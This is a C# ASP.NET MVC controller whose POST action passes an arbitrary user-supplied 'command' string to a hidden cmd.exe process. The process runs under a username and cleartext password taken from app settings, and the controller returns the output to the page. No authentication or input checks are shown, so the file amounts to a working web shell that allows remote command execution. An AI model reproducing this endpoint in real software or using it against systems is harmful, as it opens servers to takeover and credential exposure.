using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace WEB.Controllers
{
    public class CMDController : Controller
    {
        // GET: CMD
        public ActionResult Index()
        {
            return View();
        }
        
        [HttpPost]
        public ActionResult Index(string command)
        {
            if (string.IsNullOrEmpty(command)) command = "echo Azamat";
            string error = string.Empty;

            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd")
                {
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    Verb = "RunAs",
                UserName = System.Configuration.ConfigurationManager.AppSettings["UserName"],
                PasswordInClearText = System.Configuration.ConfigurationManager.AppSettings["PasswordInClearText"]
            };
                Process process = Process.Start(processStartInfo);

            process.StandardInput.AutoFlush = true;

            if (process.StandardInput.BaseStream.CanWrite)
            {
                process.StandardInput.WriteLine(command);
            }
            process.StandardInput.Close();
            var outputLines = new List<string>();
            while (!process.StandardOutput.EndOfStream)
            {
                string s = process.StandardOutput.ReadLine();
                //if (!s.Contains(":\\") && !string.IsNullOrEmpty(s))
                    outputLines.Add(s);
            }
            error += process.StandardError.ReadToEnd();
            ViewBag.OutputLines = outputLines;
            
            process.Close();
            process.Dispose();
            
            if (!string.IsNullOrEmpty(error))
            {
                ViewBag.Error = error;
            }
            ViewBag.Command = command;
            return View();
        }
    }
}